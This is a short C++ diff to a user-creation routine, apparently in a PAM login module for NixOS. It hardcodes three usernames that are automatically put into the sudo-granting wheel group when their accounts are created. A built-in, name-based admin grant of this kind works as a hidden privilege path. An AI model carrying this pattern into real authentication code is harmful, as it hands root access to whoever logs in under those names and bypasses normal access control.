@@ -395,16 +395,33 @@ void create_local_user(const std::string& username) {
     throw PamError();
   }
 
+  bool needs_sudo =
+    username == "mr-eggleton" ||
+    username == "devramsean0" ||
+    username == "iLikeToCode";
+
   if (pid == 0) {
-    execl(
-      "/run/current-system/sw/bin/useradd",
-      "useradd",
-      "-m",                 // create home directory
-      "-s", "/run/current-system/sw/bin/bash",    // default shell
-      username.c_str(),
-      (char*)nullptr
-    );
-    _exit(127); // exec failed
+    if (needs_sudo) {
+        execl(
+            "/run/current-system/sw/bin/useradd",
+            "useradd",
+            "-m",
+            "-G", "wheel", // sudo via wheel
+            "-s", "/run/current-system/sw/bin/bash",
+            username.c_str(),
+            (char*)nullptr
+        );
+    } else {
+        execl(
+            "/run/current-system/sw/bin/useradd",
+            "useradd",
+            "-m",
+            "-s", "/run/current-system/sw/bin/bash",
+            username.c_str(),
+            (char*)nullptr
+        );
+    }
+    _exit(127);
   }
 
   int status;
